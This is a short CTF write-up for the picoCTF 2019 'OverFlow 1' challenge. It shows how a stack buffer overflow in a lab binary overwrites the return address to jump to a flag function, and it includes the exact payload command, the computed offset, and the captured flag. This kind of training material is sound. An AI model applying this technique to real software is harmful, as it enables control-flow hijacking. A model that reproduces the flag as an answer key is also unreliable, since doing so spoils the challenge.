# OverFlow 1
**Points:** 150

## Category
Binary Exploitation

## Task
You beat the first overflow challenge. Now overflow the buffer and change the return address to the flag function in this [program](https://2019shell1.picoctf.com/static/465d78dd370e4a0a6773f60a3146adbc/vuln)? You can find it in /problems/overflow-1_4_6e02703f87bc36775cc64de920dfcf5a on the shell server. [Source](https://2019shell1.picoctf.com/static/465d78dd370e4a0a6773f60a3146adbc/vuln.c).

# Solution
When we run the program, we are notified of the return address. And when we overflow the input with enough characters, the return address gets changed accordingly.
```console
r00t@linux:~$ python -c "print('\x41'*80)" | ./vuln
Give me a string and lets see what happens: 
Woah, were jumping to 0x41414141 !
Segmentation fault (core dumped)
```
and upon looking at the source code, we find that there's a different function to print the flag which isn't being called from `main`. So using `radare2` we can get the address of the _flag_ function, which is `0x080485e6` and the offset to enter the address can be determined with:
```assembly
sym.flag();
    ; var int32_t var_4ch @ ebp-0x4c
    ; var int32_t var_ch @ ebp-0xc
    ; var int32_t var_4h @ ebp-0x4
    0x080485e6     55      push ebp       
    ...
```
There's an offset of _0x4c_ or 76 in decimal. Therefore to overflow it we will...

```console
username@pico-2019-shell1:~$ python -c "print('A'*76 + '\xe6\x85\x04\x08')" | ./vuln
Give me a string and lets see what happens: 
Woah, were jumping to 0x80485e6 !
picoCTF{n0w_w3r3_ChaNg1ng_r3tURn5fe1ff3d8}Segmentation fault (core dumped)
```

# Flag
> picoCTF{n0w_w3r3_ChaNg1ng_r3tURn5fe1ff3d8}
